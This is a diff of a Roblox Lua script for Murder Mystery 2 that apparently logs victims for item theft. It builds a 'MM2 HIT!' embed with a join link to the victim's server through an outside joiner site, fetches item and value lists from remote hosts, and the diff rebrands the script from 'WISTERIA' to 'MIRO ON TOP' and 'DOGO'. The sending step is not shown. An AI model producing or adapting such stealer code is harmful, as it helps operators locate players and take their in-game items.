@@ -117,7 +117,7 @@ local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
 local ItemDatabase = {}
 local RarityPriority = {"Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage", "Chroma", "Dual", "Pet"}
-local ItemListss = "https://api.rubis.app/v2/scrap/tWBAqBoSKlJ3D0YT/raw"
+local ItemListss = "https://raw.githubusercontent.com/MIRO-HUB567/MM2ITEMLIST/refs/heads/main/MM2LIST"
 local ar, aw = nil, nil
 
 pcall(function()
@@ -143,7 +143,7 @@ local function LoadDatabase()
         local RequestFunc = GetRequestFunction()
         if not RequestFunc then return end
         Response = RequestFunc({
-            Url = "https://pastefy.app/pZmGtWTo/raw",
+            Url = "https://raw.githubusercontent.com/MIRO-HUB567/MM2ITEMLIST/refs/heads/main/MM2VALUE",
             Method = "GET",
             Headers = {["User-Agent"] = "Mozilla/5.0"},
             Timeout = 10
@@ -418,11 +418,11 @@ local function BuildEmbed(ReceiverName)
     end
     table.insert(EmbedFields, {name = "Join Link", value = "[" .. string.sub(JobId, 1, 8) .. "...](https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. JobId .. ")", inline = false})
     local EmbedData = {
-        author = {name = "WISTERIA MM2 HIT!"},
+        author = {name = "MIRO ON TOP MM2 HIT!"},
         color = 0x4B5563,
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
         fields = EmbedFields,
-        footer = {text = "WISTERIA MM2 • " .. os.date("%Y-%m-%d %H:%M:%S")}
+        footer = {text = "DOGO MM2 • " .. os.date("%Y-%m-%d %H:%M:%S")}
     }
     return EmbedData, MentionText
 end
